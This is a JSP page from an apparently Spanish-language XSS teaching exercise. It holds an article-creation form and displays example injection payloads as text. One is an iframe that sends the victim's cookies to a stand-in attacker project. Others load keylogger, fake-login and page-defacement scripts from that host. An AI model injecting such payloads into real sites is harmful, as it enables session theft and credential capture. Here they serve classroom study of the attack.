<%@ page language="java" contentType="text/html; charset=ISO-8859-1"
    pageEncoding="ISO-8859-1"%>
<%@taglib uri="http://java.sun.com/jsp/jstl/core" prefix="c"%>

<c:set var="url_indeseables" 
       value="http://localhost:8081/Ej08_XSS_EjemplosAtaque_Indeseables"
       scope="page"/>
   
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1">
	<title>Insert title here</title>
	<script type="text/javascript" src="avisoTimeout.jsp"></script>
	<link rel="stylesheet" href="../css/bootstrap.min.css">
</head>
<body>

	<div class="pb-2 mt-4 mb-2 border-bottom text-center">
		<h2>
			<font color="green">
				Crear artículo
			</font>
		</h2>
	</div>

    <div class="col-xs-12 col-sm-8 offset-sm-2">

		<form action="SVArticulos" method="post">
		
	        <div class="text-center">
	            <input type="submit" class="btn btn-primary" value="Insertar""/>
	            <input type="button" class="btn btn-primary" value="Volver" onclick="window.location='SVArticulos'"/>
	        </div>
	
	        <br/>
	
	        <div class="form-group row">
	            <label for="nombre" class="col-2 col-form-label">Título</label>
	            <div class="col-10">
	                <input type="text" class="form-control" name="titulo"/>
	            </div>
	        </div>
	        <div class="form-group row">
	            <label for="direccion" class="col-2 col-form-label">Texto</label>
	            <div class="col-10">
	                <textarea class="form-control" name="texto"></textarea>
	            </div>
	        </div>
		
		</form>
		
    </div>

	<!-- Los iFrames sirven para cuando queremos incluir codigo de otro
		dominio en nuestra pagina principalmente, actualmente están en 
		desuso
		
		El primer iFrame manda id de session al proyecto Cookies_Indeseables
	  -->
	<div class="card card-primary my-3 p-0 col-8 offset-2">
		<div class="card-body">
			&lt;iframe height='0' width='0' src="javascript:document.location='${url_indeseables}/peticion_inocua?galletas='+document.cookie; "/></iframe>			
		</div>
	</div>
	
	
	<!-- Este igual que el anterior pero sin iframes e inyectando un js desde otro dominio -->
	<div class="card card-primary my-3 p-0 col-8 offset-2">
		<div class="card-body">
			&lt;script type="text/javascript" src="${url_indeseables}/javascript.js">&lt;/script>
		</div>
	</div>


	<!-- Este para capturar todo lo que escriba el usuario por pantalla-->
	<div class="card card-primary my-3 p-0 col-8 offset-2">
		<div class="card-body">
			&lt;script type="text/javascript" src="${url_indeseables}/keyLogger.js">&lt;/script>
		</div>
	</div>

	<!-- 
	sería para generar un nuevo login para engañar al usuario y que
	nos mande sus credenciales -->
	<div class="card card-primary my-3 p-0 col-8 offset-2">
		<div class="card-body">
			&lt;script type="text/javascript" src="${url_indeseables}/loginFalso.js">&lt;/script>
		</div>
	</div>
	
	<!--  
	modifica alguna parte de la página atacada
	-->
	<div class="card card-primary my-3 p-0 col-8 offset-2">
		<div class="card-body">
			&lt;script type="text/javascript" src="${url_indeseables}/modificarContenido.js">&lt;/script>
		</div>
	</div>

</body>
</html>